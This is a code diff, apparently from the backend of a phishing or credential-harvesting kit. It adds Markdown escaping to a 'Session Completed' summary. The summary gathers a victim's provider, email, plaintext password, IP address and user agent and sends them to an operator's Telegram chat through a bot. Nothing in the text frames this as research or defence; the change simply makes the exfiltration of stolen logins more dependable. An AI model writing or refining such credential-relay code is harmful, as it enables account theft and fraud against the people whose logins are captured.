@@ -398,16 +398,21 @@ try {
       message_id: messageId
     });
     let session = sessions.get(sessionId);
-   const summary = `✅ *Session Completed*\n` +
-                `\`=== ${session.provider.toUpperCase()} ===\`\n\n` +
-                `*Provider:* ${session.provider}\n` +
-                `*Email:* ${session.email}\n` + 
-                `*Password:* ${session.password || 'N/A'}\n` +
-                `*IP Address:* ${session.ip || 'N/A'}\n` +
-                `*USER AGENT:* ${session.userAgent || 'N/A'}\n` + 
+      const escapeMarkdown = (text) => {
+    if (!text) return 'N/A';
+    return text.replace(/[_*[\]()~`>#+=|{}.!-]/g, '\\$&');
+  };
+  const summary = `✅ *Session Completed*\n` +
+                `\`=== ${escapeMarkdown(session.provider?.toUpperCase() || 'UNKNOWN')} ===\`\n\n` +
+                `*Provider:* ${escapeMarkdown(session.provider || 'N/A')}\n` +
+                `*Email:* ${escapeMarkdown(session.email || 'N/A')}\n` + 
+                `*Password:* ${escapeMarkdown(session.password || 'N/A')}\n` +
+                `*IP Address:* ${escapeMarkdown(session.ip || 'N/A')}\n` +
+                `*USER AGENT:* ${escapeMarkdown(session.userAgent || 'N/A')}\n` + 
                 `*Time:* ${new Date().toLocaleString()}`; 
-    await bot2.sendMessage(TELEGRAM_CHAT_ID, summary, { parse_mode: 'Markdown' });
-    break;
+  
+  await bot2.sendMessage(TELEGRAM_CHAT_ID, summary, { parse_mode: 'Markdown' });
+  break;
   }
 
 
